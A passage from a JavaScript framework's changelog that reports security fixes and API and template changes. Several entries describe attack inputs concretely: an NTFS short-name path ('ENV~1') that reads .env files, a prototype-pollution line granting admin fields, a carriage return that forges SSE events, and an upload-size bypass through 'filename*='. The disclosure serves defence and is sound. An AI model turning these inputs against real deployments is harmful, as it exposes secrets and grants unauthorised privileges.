  becomes `attachDevtools(server, { token })`.** The bridge streams `exportSession()` on connect,
  which is a preview of every live signal and memo - and because a request on this framework IS a
  reactive root, that is per-request state. A reviewer's run over a plain socket with no
  credentials read a session token, an account record with IBAN and balance, and an admin key.
  Its entire perimeter was the `Origin` header, and the default check returned TRUE for a missing
  Origin, which is exactly what a non-browser client sends. The environment guard compared
  `NODE_ENV === 'production'` and therefore attached for unset, `""`, `Production`, `prod` and
  `staging`. It is now gated four ways, all of which must pass: a POSITIVE `NODE_ENV=development`
  check (so a misspelled or unset value refuses rather than opens), a shared token of at least 16
  characters compared in constant time, a loopback peer, and a present localhost `Origin`.
  `allowNonDevelopment` and `allowRemoteClients` are the explicit opt-outs. All four run before
  the handshake, so a refusal writes no session byte, and a caller-supplied `verifyOrigin` can no
  longer replace the token and peer checks. No inbound command surface was added: the bridge
  still never reads a frame.

- **A 1 MiB request body could cost 2.2 seconds of blocked event loop and a 148 MiB response.**
  The schema issue collector was unbounded in its default collect-everything mode, and each array
  element of an `object()` emits one issue PER DECLARED FIELD, so the canonical bulk shape
  `array(object({...}))` turned a body under the kernel's own default limit into 1.75 million
  issues, serialized into the 422 twice (as the issue list and as the field map). Issues are now
  capped at 100 with the result marked `truncated`, and the array, object and record loops stop
  once the ceiling is hit rather than walking the remaining elements. An ordinary handful of
  failures still reports every one. No default `array()` maximum was added: the cap makes it
  unnecessary, and silently rejecting a legitimate 2,000-element array would be a worse trade.

- **One logger throw killed the cron process, and the framework's own logger threw on ordinary
  values.** In the scheduler, `logger?.debug` ran synchronously inside a `setTimeout` callback
  (an uncaught exception), and the settle-handler log calls rejected the promise that `void
  run(job)` discarded - with the log line running BEFORE `report()`, so the `onError` observer
  never saw the failure it exists to report. Meanwhile the logger's serializer called bare
  `JSON.stringify`, which throws on a BigInt, a circular structure, a throwing getter, a throwing
  `toJSON`, or a throwing `.stack`: `log.info('paid', { amount: 10n })` threw in any app that
  keeps money in BigInt. Every logger call in the scheduler is now isolated exactly as the
  observer already was, `report()` runs first, and the serializer degrades to a marker instead of
  throwing. A payout worker no longer exits mid-cycle because a log line could not be written.

- **A cyclic error-shaped field OOM-killed the process through the pretty sink**, with no
  catchable exception, because the cause walk had no depth cap and concatenated a string per hop
  while `isErrorShape` accepted any object with `name`/`message`. The walk is now depth-bounded
  and cycle-aware.

- **Redaction missed the shape everyone actually logs.** It matched top-level keys only,
  case-sensitively, over own properties - while serialization emitted inherited keys too. So
  `Authorization` was not `authorization`, `{ headers: req.headers }` was stringified whole, and
  a secret on the fields object's prototype was written but never redacted, all while the module
  header promised "a redacted field never reaches ANY sink". Redaction is now case-folded,
  matches a bare name at any depth, supports dotted paths, is transparent through arrays,
  depth-capped and cycle-aware, and never mutates the application's own object. The serializer
  and the redactor now iterate one key set.

- **`object()` read INHERITED properties, turning any prototype pollution elsewhere into mass
  assignment through the validator.** With `Object.prototype.role = 'admin'` polluted by any
  other component, `object({ name, role, isAdmin }).parse(JSON.parse('{"name":"bob"}'))` returned
  `role: 'admin', isAdmin: true` as VALIDATED data - from the one layer an app trusts to make
  input safe, and which correctly strips unknown OWN keys. Field reads are own-property only now.

- **A validation error whose path collided with an `Object.prototype` member was erased or
  replaced by a function on the wire.** `__proto__` hit the prototype setter and vanished (the
  wire showed `Validation failed for 0 fields` with an empty map), while `constructor` kept the
  inherited function, which `JSON.stringify` then omitted. Any consumer treating the documented
  `FieldErrors` as `Record<string, string>` would crash on it. The map is null-prototype and
  written through `defineProperty`, and `record()` now strips an own `__proto__` key so a
  validated body is safe to `Object.assign` - it previously handed the handler a
  prototype-pollution primitive.

- **A calendar-impossible cron expression cost ~880 ms of `Intl` calls before failing**, so ten
  registrations stalled a boot for 8.5 seconds and any app exposing job registration turned one
  request into ~0.9 s of total unavailability. Impossible day and month pairs are now rejected
  arithmetically at parse time: the same seven expressions went from about 6 seconds to under
  200 ms, and the leap-day case still resolves correctly.

- Also: a throwing sink can no longer break the log call; the pretty face strips terminal control
  bytes from field values, the message, the error block and the request path, so a log line can
  no longer clear the operator's screen; `phone()` answers a non-string with a message instead of
  a TypeError, matching every sibling validator; `SchemaError.message` bounds and sanitizes
  attacker-supplied paths rather than repeating them in the framework's own `path: message`
  grammar; and the log directory and file are created 0700/0600 with `mode` options, so files
  that can contain bearer tokens are not world-readable.

### Security (http bodies, uploads, file serving, streaming)

- **A streaming response that failed mid-body killed the process, and every aborted compressed
  download leaked a file descriptor.** `compressResponse` used `.pipe()` rather than
  `pipeline()`: when the source errored, Node's pipe handler unpiped itself and re-emitted on a
  source with no listener, which is an unhandled `'error'` event and an immediate exit (confirmed
  at exit code 9; the identical server without compression survived). The same missing
  propagation meant a client disconnect destroyed only the zlib transform, never the
  `fs.ReadStream` behind the file. The trigger was routine rather than hostile: a database cursor
  dying halfway through a streamed report. One switch to `stream.pipeline` closes both
  directions.

- **`staticFiles` served `.env` and `.git` on Windows.** The dotfile guard ran on the REQUESTED
  path, but NTFS 8.3 aliases resolve on the filesystem, so `/assets/.env` correctly 404'd while
  `/assets/ENV~1` returned the file, case-insensitively and through percent-encoding. The
  containment check already called `realpath`, but only to compare a prefix. The dotfile rule is
  now applied to the RESOLVED path.

- **A lone carriage return in an SSE payload forged arbitrary events, including the event name.**
  The framer split on `\n` only, but the event-stream grammar also terminates a line on a bare
  CR, so everything after one parsed as fresh fields. Verified in real Chromium: a single
  `send()` of user text produced a forged `transfer` event with an attacker-chosen payload.
  `event:`, `id:` and `comment()` were not sanitized at all and are now single-line by
  construction.

- **Reading the body twice hung the request forever, and only in production.** The adapter's fast
  lane attached `'end'` to an already-drained stream, so the promise never settled - and because
  the body had been fully received the request timeout was already cleared and nothing reclaimed
  the socket. One wedged connection and one leaked request root per attempt, unbounded. It was
  invisible in tests because the portable path throws a locked-stream error instead, so the shape
  that matters (an HMAC guard reading the raw body, then the handler reading it again) failed
  only on the Node adapter. Both lanes now fail identically and loudly, an abort settles the
  read, and `bodyUsed` tells the truth after a fast-lane read.

- **`sse()` leaked its producer, heartbeat and request root when the client was already gone.**
  It registered an abort listener without checking `signal.aborted` first, and a listener added
  to an already-aborted signal never fires, so a disconnect during setup left the 15s heartbeat
  armed and the producer pending forever. Measured 13 heartbeats produced after the client left,
  with zero teardowns.

- **An SSE producer failure was reported to the client as SUCCESS.** The catch discarded the
  error and called `close()`, which emits the `[DONE]` terminator, so a ledger or price stream
  that died after page one was consumed as complete and the operator got no signal at all. The
  stream now ends WITHOUT the terminator and the error is reported through a new `onError`, or
  rethrown so the runtime sees it.

- **`maxFileSize` was bypassable, and binary uploads were silently corrupted, via `filename*=`.**
  Part classification matched only `filename=`, so the RFC 8187 form was treated as a text field:
  exempt from the per-file cap (a 300 KB part passed a 1 KB limit) and UTF-8 decoded rather than
  preserved (`89504e47fffe0001` came back as `efbfbd504e47efbfbdefbfbd0001`), which is exactly
  the mangling the module documents itself as avoiding. The inverse also worked: a `;` inside a
  quoted `name` forged a filename. Parameters are now scanned outside quoted strings only, and
  `filename*` is decoded and takes precedence.

- **A hostile multipart boundary made the parser quadratic.** The client picks both the boundary
  and the bytes, and the buffered parser searched with no skip heuristic and an un-prefixed
  delimiter, so 63 ms of blocked event loop per MiB (14x a benign boundary) ran BEFORE any
  part-count limit. The buffered path now uses the same CRLF-prefixed delimiter the streaming
  path always did: 1 MiB of dashes went from 41.5 ms hostile / 2.0 ms benign to 0.9 / 0.8.

- **Compression ignored `q=0`, so responses were encoded with codings the client had explicitly
  refused** (`br;q=0, gzip` was served br). Weights are now parsed, `q=0` is a refusal, and the
  heaviest weight wins. `Cache-Control: no-transform` is honoured, and a compressed response
  carries its own ETag so a cache can no longer serve gzip bytes as identity - with the
  conditional path accepting an encoding-suffixed validator only while the client still accepts
  that coding, so revalidation still answers 304.

- **`staticFiles` advertised `Last-Modified` and ignored `If-Modified-Since`**, so every
  conforming cache, CDN and `curl -z` got a full retransmission. It is now honoured, with
  `If-None-Match` keeping precedence.

### Security (http middleware)

- **A throwing CORS origin predicate or rate-limit store took the process down.** The idiomatic
  subdomain allowlist is `origin: (o) => new URL(o).hostname.endsWith('.example.com')`, and
  browsers themselves send the literal `Origin: null` for sandboxed iframes, so one curl was an
  unauthenticated kill. A predicate throw is now a denial, and a store outage or throwing key
  fails CLOSED to a 429 rather than a rejection.

- **`cors({ origin: true, credentials: true })` reflected any origin, including `null`, with
  credentials.** The guard against `*`-with-credentials existed but DOWNGRADED to reflecting the
  caller's Origin while still sending `Access-Control-Allow-Credentials: true`, which is strictly
  worse: browsers block the former and honour the latter. Any website could read an authenticated
  response. That combination now throws at wiring time, and the scaffolded backend template names
  an explicit dev origin instead.

- **`serializeCookie` interpolated `path` and `domain` raw**, despite documenting that it
  validates attribute values. Since duplicate cookie attributes are last-wins, a tenant-derived
  path could widen a session cookie across every sibling subdomain, and a CRLF in one killed the
  process through `writeHead`. Both are now validated against their RFC 6265 grammars, and a
  non-finite `maxAge` no longer emits `Max-Age=NaN`.

- **The rate limiter was decorative in every real deployment.** Its default key is the TCP peer,
  so behind any proxy every client shared ONE bucket and the configured limit became a global
  budget: 100 requests per minute locked out the whole service. `trustProxy` fixed only a
  single-proxy chain because `trustedHops` was never forwarded and was absent from the options.
  And the key used the full IPv6 /128, so one VPS with a routed /64 had 2^64 free buckets and
  never tripped the limiter at all, with nothing spoofed. `trustedHops` is now forwarded, keys
  bucket IPv6 to a configurable prefix (default /64) via the new `ipBucket`, and a runtime with
  no client identity refuses loudly instead of silently sharing one bucket.

- **The limiter's own memory was unbounded**: it swept on a fixed 60s interval regardless of
  `windowMs`, had no entry cap, and accepted an attacker-sized key. The sweep now tracks the
  window, the map has a capacity with oldest-key eviction, and keys are bounded.

- **CORS preflights bypassed the limiter entirely** in the middleware order the framework itself
  scaffolds, giving an unmetered request channel. Preflights now delegate through the inner
  handler and carry its `RateLimit-*` headers.

- **Preflight reflected `Access-Control-Request-Headers` verbatim**, approving Authorization and
  any CSRF header the caller named, which removed the last mitigation once an origin check was
  permissive. The default is now the CORS safelist plus Content-Type.

- **`securityHeaders()` silently overwrote a handler's stricter header**, so a route hardened with
  `X-Frame-Options: DENY` was downgraded to the global `SAMEORIGIN`. A baseline value now yields
  to a header the response already carries, while an explicitly configured value still wins.

- **HSTS was emitted over plaintext on the client's word**, contradicting the module's own stated
  guarantee, by reading `X-Forwarded-Proto` with no trust gate - the same header the adapter
  refuses to believe without `trustProxy`. It is now gated by an explicit option, and the
  pre-existing test that asserted the vulnerable behavior has been corrected.

- **`logRequests` emitted NO record when `Host` was malformed.** It built a URL to get the path,
  which throws on an authority the router never parses, and observer throws are swallowed by
  design - so a request was fully served with no audit line at all. It now uses the kernel's own
  string scan.

- **`prettySink` could be line-forged**: string fields and the message were interpolated raw
  while non-strings went through `JSON.stringify`, so a newline in a user-supplied field wrote a
  second line indistinguishable from a real record. Control characters are now escaped.

- **`loadConfig` printed a `secret: true` variable's raw value in the boot error**, straight to
  stderr and CI logs, because the redaction covered the object's serializations but not the
  failure path. It now names the variable without echoing the value, and `flag`/`oneOf` accept
  `secret` too.

- **`parseCookies` dropped any cookie named after an `Object.prototype` member** (`toString`,
  `constructor`) because membership was tested with `in` on a plain object, returning the
  inherited function. The record is null-prototype now.

### Security (contract layer)

- **A guard key that addressed no route was silent, leaving those routes unguarded.** `mountApi`
  enforced handler coverage at boot and had no equivalent check for guards, and the type could
  not catch it either: `Guards` is inferred from the map literal, so TypeScript's
  excess-property check only fires when NO key is valid, and every real map has a valid key
  (usually `'*'`). A renamed group, or a wildcard written for an absolute path and then mounted
  as a subtree, therefore produced an unauthenticated endpoint with no compile error, no boot
  error and no log line - and because a pure gate (auth, CSRF, rate limit) adds nothing to the
  context, no handler type changed either. An unmatched guard key now throws at mount, naming
  the key and listing the known routes. The doc comment that claimed the type caught this has
  been corrected to describe what the code actually guarantees.

- **Three prototype-shadowing lookups in the mount are own-property only.** A route keyed
  `toString` crashed the mount with an opaque spread error, and a query or multipart field named
  `constructor` was silently replaced by the inherited function and 422'd the route forever.

### Changed (schema)

- **Schema composition is object composition; no `extend`/`pick`/`omit` was added.** An input
  schema and the stored shape it grows into share fields, and the obvious fix was three new
  combinators. They are not needed: `object()` takes a plain literal, so keeping the FIELDS as
  the reusable value lets `{ ...entryFields, id: number() }` extend, destructuring omit, and
  selection pick - with exact inference and the constraints carried along, which a typecheck
  now pins. Three functions that re-express what the language already does would have been
  surface to learn, document, and keep working for nothing. The fullstack template shows the
  pattern instead of repeating `name` and `message` across its two schemas.

### Fixed (schema)

- **`phone()` accepted a malformed number built from the `00` international prefix.** With a
  default country, `00989170459330` was normalised by stripping a single leading zero and
  prepending the calling code, producing `+980989170459330` - fifteen digits beginning with
  the Iranian calling code, so it passed both the digit-count bound and the country filter.
  A silently accepted wrong number is worse than a rejected right one: `00` is now read as
  the international call prefix before national normalisation runs, so `00989170459330` and
  `+989170459330` are the same number, and `0014155551234` is correctly judged as `+1`.

### Added (compiler)

- **`azeroth/markup-indent` lints the indentation of markup tags.** ESLint's own `indent`
  cannot: the ESLint plugin lints the PROJECTION, whose whitespace the compiler re-flows, so
  a report there would name a column the author never wrote - which is why the whole layout
  rule family is off on `.azeroth`. This rule reads the original source instead, so its
  positions and its fix are the author's own text. It judges each element as a WHOLE - the
  opening tag, every attribute that starts a line, the `>` that closes a wrapped tag, and the
  closing tag - because moving the opening tag alone is how an indentation autofix leaves a
  file worse than it found it. Expression holes are skipped entirely (their contents are
  TypeScript) and so is text, and only lines a tag OPENS are judged, so `<b>a</b><i>b</i>` on
  one line stays an authoring choice. Configure it with the `markupIndent` plugin option
  (spaces per level, `0` disables, default `4`); the ESLint processor reports it as
  `azeroth/markup-indent` and `eslint --fix` applies it. Measured against every `.azeroth`
  file in the repo and a real production app before it was allowed near a fix: zero false
  positives, and it found one genuine defect.

### Fixed (compiler)

- **A `deferred` or a wrapper block inside a module-level composable compiled to invalid
  JavaScript.** Module-scope regions are pre-filtered for a keyword before the nested lowerer
  runs, so keyword-free code stays byte-identical and keeps a clean source map - but that
  filter hand-listed `state|derived|effect`, three of the ten words that can start a lowerable
  construct. A `deferred slow = heavy;` or a `cleanup { ... }` in a composable therefore fell
  through and was emitted VERBATIM, which is not valid JavaScript. The projection lowered the
  same code correctly, so the editor and `azeroth check` were green and the failure only
  appeared when the bundle ran. The filter is now derived from the keyword table
  (`LOWERABLE_WORDS`), so a keyword is covered by declaring it there. The factories and `form`
  stay out of it deliberately: the nested lowerer does not transform them, and listing them
  would cost the verbatim mapping of any module that uses `form` or `store` as a plain name.

### Changed (http)

- **Handlers are keyed by the contract's DOTTED ROUTE PATH; the nested handler tree is gone.**
  BREAKING. One route had two addressing schemes: guards were always dotted (`'admin.orders'`,
  `'admin.*'`), while handlers were a nested object that had to mirror the contract's shape. The
  nesting bought nothing at runtime - the mount already computed the dotted path one line above
  the handler lookup, to resolve guards - and it cost a feature its independence: to be spread
  into the mount it had to be wrapped at exactly the depth it lands, so a feature file knew which
  group it belonged to and moving a service under a new prefix edited every feature. Now
  `handlers: { 'guestbook.sign': ... }` shares the guards' key space, assembling features is a
  plain spread with no wrapper, and a key that is not a route path is a compile error rather than
  a silently ignored entry. To migrate, flatten each nesting level into a dotted key.

- **`@azerothjs/http/api/client` is now `@azerothjs/http/api/shared`.** BREAKING, and the old
  specifier is gone rather than aliased. A contract is ONE declaration both halves read, but a
  contract file had to import `defineContract` from a path named `client` - which reads as
  "contracts are a client-side thing", the exact opposite of what they are. The subpath never
  meant "the client's half"; it meant "the half that is safe to put in a browser bundle", and
  the name taught the wrong model to at least one reader. `shared` says what it is. The
  boundary itself is unchanged and still statically proven: the entry cannot reach `mountApi`,
  `guard`, or anything Node, so importing it can never drag the server into a bundle. To
  migrate, replace the specifier; nothing else moves. Note for whoever cuts the release: the
  fullstack template now imports the new specifier, so a scaffolded app only resolves once this
  version is on the registry - templates pin the version they ship beside, and until then a
  local scaffold must point its `@azerothjs/*` deps at the workspace.

### Added (http)

- **`group(prefix, routes)` writes a service's base path once.** In a real 17-route app, 14 routes
  restated `/admin` and 3 restated `/pay`, which is a rename waiting to go half-finished. `group`
  prepends the prefix to every route it wraps, including nested groups. Paths stay EXPLICIT
  strings rather than being derived from key names, because a key and its path legitimately differ
  - `signIn` answers `/session` - and a framework that guessed would be wrong exactly where it
  matters.

- **`merge(...groups)` refuses to lose a route.** Combining feature groups was an object spread,
  which is last-wins: two features that happened to pick the same key dropped one of the routes
  out of the API with nothing failing anywhere, and the router's own duplicate check only fires if
  the two also share a method and a path. `merge` throws on a duplicate key, naming it, at module
  load - so the failure is at boot in every environment rather than a 404 in production.

- **`only()` makes a group guard usable: guard the wildcard, name the exceptions.** Guarding an
  admin console meant listing every route by hand - twelve `'admin.x': [requireAdmin]` lines -
  purely so the one route that must NOT be guarded (signing in, which is how you get past the
  guard) could be left out. That is backwards: the default was unguarded, and a route added
  later was silently public. `'admin.*': [requireAdmin]` now covers the group, and
  `'admin.signIn': only([...])` declares a complete chain that replaces everything it would
  otherwise inherit. The opt-out is EXACT-PATH only, because a wildcard cancelling another
  wildcard would make a route's real chain depend on declaration order. Crucially it resets the
  TYPE as well as the runtime chain: an opted-out handler cannot read a field no guard attached,
  which would otherwise be an `undefined` behind a property TypeScript promised was there.

- **`implement()` lets a feature type its handlers from its own routes.** A feature owning part
  of a larger contract had to describe its handlers by reaching for the assembled tree and
  narrowing it - `Pick<HandlersWithGuards<typeof contract, Record<never, never>>['admin'],
  'signIn' | 'overview' | ...>` - which imports the whole contract to say something local,
  names every route a third time, and hardcodes the guard additions as "none". The observable
  cost was that handlers went back to hand-annotating their own context, which is exactly the
  work the derived types exist to do. `implement(routes, handlers)` is identity at runtime and
  types the handlers against that group alone, with the guards' additions as an optional second
  type argument, so a feature file needs no reference to the contract it joins and a missing,
  extra, or wrongly-typed handler is a compile error at the feature rather than at the mount.

### Fixed (http)

- **`route()` let a GET declare a request body.** The six verb helpers cover every
  `ApiMethod`, and `get`/`del` take a definition type with no `input` field - but `route`,
  the primitive they are built on, accepted `{ method: 'GET', input }` and produced a
  contract whose client would send a body no GET should carry. Its definition type is now
  conditional on the method, so a literal bodyless method narrows exactly as the helper does
  while a widened `ApiMethod` still type-checks - which is the one thing `route` is for, and
  why it stays: assembling a contract from configuration, where the method is not a literal.
  It is the same primitive-plus-sugar pairing `app.route` has with `app.get`.

### Changed (http)

- **The contract docs lead with the verb helpers.** `get`, `post`, `put`, `patch`, `del` and
  `query` have always shipped, but every example taught `route({ method: 'GET', path: '...' })`
  instead - the general form, three tokens longer, with the method buried in a property. The
  verb form is also strictly SAFER: `get`/`del` take a definition with no `input` field at all,
  so `get('/x', { input })` does not compile, while `route({ method: 'GET', input })` happily
  declares a body on a GET.

  Worth knowing when converting: `del` and `get` being bodyless is what surfaces a DELETE
  that carries a request body. The portable replacement is usually the QUERY STRING rather
  than a path param - `del('/things', { query })` keeps the schema at the boundary, while
  `/things/:id` moves the identifier into a raw `string` with no schema behind it (there is
  no `params` validator by design; a path param is matched, not parsed).

- **The contract's response model is one concept.** A route's response contract is the
  per-status `responses` map, and `output` is the declared shorthand for its 200 entry -
  the docs said as much, but the mount only half-believed it: `reply(200, ...)` validated
  against `responses[200]`, while a PLAIN 200 return only validated when `output` was
  declared, so a route carrying `responses: { 200: shape }` alone sent plain returns to
  the wire unchecked. Both paths now share one per-status lookup, and the OpenAPI exporter
  derives the 200 entry and the contract-violation 500 from that same rule, so the
  document matches what the mount enforces. Alongside it, the boundary's schema
  unification (native `safeParse` when present, `~standard.validate` otherwise) now lives
  in one module shared by the server mount and the client's pre-flight check, and
  `RouteSchema<T>` names what was always structurally true: any Standard Schema validator,
  with the native schema's extras discovered by capability, never required.

### Removed (http)

- **The browser entry no longer exports `guard`.** BREAKING for anyone who imported it from
  `@azerothjs/http/api/shared`, which nothing in either repo did. A guard runs on the server, in
  front of a handler; there is nothing for one to do in a browser, and the entry's own header
  states that the guard and mount half "lives only in the root entry". Exporting it there was
  server surface leaking into the one entry whose whole job is to be safe to bundle. `guard`,
  `Guard`, and `GuardContext` come from `@azerothjs/http/api` as they always did.

- **The contract layer's dead type machinery is gone.** An audit of all 46 exports in the layer,
  each verified by deleting it and re-running the type-level assertions under `tsc`: the
  `StandardSchemaV1` re-export (no consumer, and in neither entry, so no package consumer could
  even see it), `Guard`'s phantom `__add` field (`AddOf` infers through the call signature, so the
  declaration was its own only reference), the unused outer `infer` in `AddOf`, and the outer
  conditional in the client's `Call` type, which tested `extends Record<string, never> | unknown`
  - unconditionally true, making its `never` branch unreachable. Nothing observable changes; there
  is simply less to read. Deliberately KEPT despite having no consumer yet: `uncontracted`, which
  is how an existing app burns down onto contracts one route at a time, and the OpenAPI exporter
  plus explorer, 42% of the layer and the only path by which a non-TypeScript client can consume
  the API at all.

- **A route's response schema is resolved in one place.** The rule that `responses[status]` wins
  and `output` is the shorthand for the 200 entry was implemented twice, independently, in the
  mount and in the OpenAPI exporter - which is how a document starts describing something the
  server does not enforce. Both now call one `responseSchemaFor`. In the same pass the mount's
  "first value wins" flattening of repeated query parameters and repeated multipart fields, two
  copies of one loop with a comment on the second promising it matched the first, became one
  shared helper.

### Added (create-azeroth)

- **The devtools panel is wired into the templates that can host it.** A framework whose pitch
  is a visible reactive graph shipped starters that never showed it. `frontend` and the
  fullstack `application` now mount the inspector in dev, and the fullstack `server` attaches
  the bridge its Server tab reads, so "every request is a reactive root" is something you can
  watch rather than something the README asserts. `backend` deliberately gets none: the panel
  is a page and that template serves none, so it gets a README note on pointing another app's
  Server tab at it instead. Dev-only by construction, not by convention - the client calls sit
  behind `import.meta.env.DEV`, which a build replaces with `false` so the branch and its
  dynamic import are eliminated entirely, and `attachDevtools` throws under
  `NODE_ENV=production` and accepts only localhost origins. The call goes BEFORE
  `render`/`bootClient`, because the runtime only registers primitives constructed after the
  hook is installed; placed after, the panel opens on an empty graph.

- **The dev port is declared, not inherited.** The fullstack README promised "vite on :5173"
  twice while nothing in the project said so - it was vite's implicit default, so a busy 5173
  moved the app to 5174 and the README quietly became wrong (and now the devtools bridge URL is
  written against those ports too). Both client templates declare `server.port` explicitly, and
  because a tailwind overlay REPLACES `vite.config.ts` wholesale rather than merging into it,
  the overlay copies had to restate it - a new test scaffolds every option combination and
  asserts the port and the `/api` proxy survive. Servers stay on 3000: it is the Node
  convention and it is already baked into `.env.example`, `EXPOSE`, `docker run -p`, and the
  `config.port` default. Vite still steps to the next free port rather than failing, so a busy
  machine is still a working first run.

- **Every template ships an `.editorconfig`.** The same one the framework itself uses: UTF-8,
  4-space indent, final newline, trimmed trailing whitespace, and single quotes for
  TypeScript (including the JetBrains key that actually enforces it). A scaffolded app
  therefore formats the way its own source is written from the first keystroke, in any editor,
  with no extension to install. It ships under its real name rather than the `_`-prefixed form
  `.gitignore` needs, because npm reads a nested `.gitignore` as pack-ignore rules and has no
  such handling for this file - the pack test asserts all three arrive.

- **The template READMEs are a proper first page.** Each scaffolded app now opens with a
  centered header and badges, then walks the reader from `npm install` to deploy: a "start
  here" block that says what they will SEE, the scripts and structure as tables, a worked
  example of the thing that template teaches (writing a component, adding a route, the
  fullstack canon tour), and a "next" section that names the one-line change for adding a
  page, an endpoint, or a loader. The `--router` and `--tailwind` overlays append matching
  sections instead of a bare paragraph. Every backticked path in every README is checked to
  exist in the scaffolded tree.
- **CI ships with every shape**, not only `fullstack`. The `frontend` and `backend`
  templates both advertise `npm run check` as their gate and had no workflow to run it.
- **The templates use the `azeroth test` verb**, closing the last gap in the README's promise
  that "every template ships the `azeroth` verbs as its scripts".
- **The shipped tests are typechecked.** All four `tsconfig.json` files scoped `include` to
  `src`, so the `tests/app.spec.ts` every template ships was in no program: a broken test type
  passed `npm run check` and only failed at `npm test`.
- **A test asserts the dependency contract in both directions** - every package a template
  imports is declared in the manifest that owns it, and every declared dependency is used or
  named on an allowlist of bin/loader packages that carry their reason inline (`jiti` loads
  the ESLint TS config, `@azerothjs/language-server` ships `azeroth-tsc`), so a future depcheck
  cannot prune them.

### Changed (create-azeroth)

- **The backend template teaches middleware instead of three toy routes.** `app.use` and
  `app.with` appeared in NO template, so the one thing every real backend needs on its first
  day - a middleware that authenticates a request and attaches something to the context - was
  the one thing a reader never saw. `/hello/:name` and `/echo` are replaced by a single route
  on an `app.with` fork that covers everything they did (a typed path param, `readJson` with
  its body limit and Content-Type check, a `ValidationError` landing in the envelope's
  `error.fields`, a 201 with a shaped body) plus three things they did not: scoped middleware,
  typed context additions read with no cast (`context.userId`), and rejecting a request before
  the handler runs. `/healthz` stays: it is infrastructure every orchestrator probes, not a
  demo. The template's own test grew from three cases to five, and now covers the middleware
  veto and the field map.

- **The fullstack template's wiring files carry code, not lectures.** `server/src/contract.ts`
  was 27 comment lines around 20 lines of declaration - 57% prose, in the file a reader opens
  every time they add a route, explaining what the README already explains better. The
  template's wiring dropped from 485 lines to 403 with nothing removed but narration. What
  survives states a constraint the code cannot: this file is client-safe so importing a service
  here would bundle the server, the key path IS the client's call path, a trailing space
  survives SSE framing while a leading one is eaten, devtools must install before the first
  render. The declaration now reads as an example worth copying rather than a tutorial to skim.

- **The fullstack template teaches both kinds of route, and streams.** It implied everything
  belonged in the contract, which is wrong and is why the contract felt like overhead: the
  typed client REFUSES a multipart route by design, and a streaming response has no JSON body
  to validate, so uploads, webhooks, redirects and token streams were never its job. The
  server half now has `src/stream.ts` beside `src/contract.ts` holding the raw routes, with
  `GET /api/assistant` as a worked server-sent token stream, and the README states the rule:
  the contract is for routes whose whole request and whole response are JSON values worth
  validating, everything else owns its own `Response`. The home page consumes it with the
  `stream` keyword - which no template previously demonstrated - accumulating events into one
  reactive string, and its Stop button cancels the request, which is where a real handler
  stops paying a model provider.

- **Import depth is now a tested constraint.** The tailwind overlay ships its own copy of the
  guest-book page, so fixing the base template's deep import left the overlay's behind - a
  `--tailwind` app still got `../../../server/src/contract.ts`. Both are fixed, and a test now
  scaffolds every template and option combination and rejects any import climbing more than one
  directory, with `application/src/api.ts` whitelisted as the single cross-half seam. Path
  aliases are deliberately NOT the answer here: the zero-build server halves run under plain
  `node`, which does not read tsconfig `paths`, and the compiler's build-time gate for
  `.azeroth` files uses fixed options with no `paths` either - so an aliased import would
  resolve to nothing and silently type as `any` in the one place that is supposed to catch it.

- **The fullstack template's server boots from two files instead of three, and a page no
  longer climbs out of its own half.** `server/src/config.ts` held twenty lines read by exactly
  one importer, so the environment moved to the top of `server/src/main.ts` beside the logger,
  the pipeline, `serve` and shutdown - the same fold the backend template got, for the same
  reason, and `server/src/app.ts` stays a separate pure module so `app.handle(new Request(...))`
  remains a socket-free test. Separately, `application/src/pages/guest-book.azeroth` reached the
  shared schema through `../../../server/src/contract.ts`: three levels up, out of the page
  directory, out of `src`, and across into the other half, which broke the moment a page moved.
  `application/src/api.ts` is now the one seam that crosses halves - it already owned the
  contract-derived client, so it re-exports the shapes pages need and a page imports client and
  schema from one place. The cross-half relative import stays visible in that file, because
  compile-time coupling to the server's declaration is the point.

- **The backend template boots from one file instead of three.** `src/config.ts` held twenty
  lines read by exactly one importer, so the environment now lives at the top of
  `src/main.ts`, where the values are used: `.env` first, then the typed `loadConfig` block,
  then the logger, the edge pipeline, `serve`, and shutdown - the whole outside world in the
  order it happens. `src/app.ts` is untouched and stays a separate module on purpose. That
  boundary is not stylistic: because `buildApp` cannot see the config, it cannot accidentally
  read the environment, which is what keeps `app.handle(new Request(...))` a socket-free test
  with no fixtures. Merging all three into a single file would have needed an
  `import.meta.main` guard to keep the test from booting a real server, and that is Node
  24.2+ while the template's floor is `>=24` - on 24.0 the guard is `undefined` and the
  server silently never starts.

### Fixed (create-azeroth)

- **The fullstack template linted its own build output.** `dist-server/` - the SSR bundle
  from `vite build --ssr` - was missing from the ESLint ignore list, so running
  `azeroth check` after `azeroth build` reported thousands of style errors in generated
  code.
- **Four dependencies were used but never declared**, resolving only through npm's workspace
  hoisting and auto-peer-install. `fullstack/application` imports `@azerothjs/http` directly
  and pulls `@azerothjs/schema` into the BROWSER bundle through the shared contract while
  declaring neither; `backend` and `fullstack/server` never declared `azerothjs`, a required
  peer of both `@azerothjs/http` and `@azerothjs/kit`; and `fullstack/application` ran
  `azeroth` in three of its own scripts without declaring the CLI. Each worked until the half
  was extracted from its workspace or an upstream package dropped a dependency.
- **The fullstack `.dockerignore` was never read.** Docker reads it from the build-context
  ROOT, and the documented build is `docker build -f server/Dockerfile .` from the project
  root - so the file sitting beside the Dockerfile did nothing, and `COPY application
  ./application` shipped `application/node_modules` into the image. It now lives at the root
  with `**/`-prefixed patterns, because a bare `node_modules` matches only the top level and
  this is a workspace.
- **A fullstack scaffold offered to commit its request logs.** The server writes NDJSON to
  `logs/` from its first boot; the root `.gitignore` never mentioned it, and the server half
  shipped no `.gitignore` of its own. The `backend` template had this right all along.
- **`.gitignore` ignored a directory that does not exist.** Three templates listed
  `.azeroth-types/` while the compiler writes its declaration mirror to `.azeroth/types` - so
  the entry was dead AND the real mirror was left untracked-but-unignored. The ESLint configs
  had the correct path all along.
- **`engines` promised a Node that cannot run the code.** The `backend` and `fullstack`
  templates run TypeScript with no build step, and their Dockerfiles (`node:24-slim`), their
  CI, and their own source comments all say Node 24 - while `engines` said `>=22`, which
  cannot strip types unflagged before 22.18. They now say `>=24`; `frontend` stays at `>=22`
  because vite compiles it.
- **One house style, not two.** The four ESLint configs had drifted into pairs: `frontend`
  and `backend` kept the core `indent` rule and allowed TypeScript `private`, while both
  `fullstack` halves dropped `indent` and banned `private`/`protected` in favour of native
  `#private`. Which rules you got depended on which template you picked. They are unified, and
  `indent` is enforced everywhere - the `=> ({ ... })` autofix problem cited when it was
  removed does not reproduce on any template source.
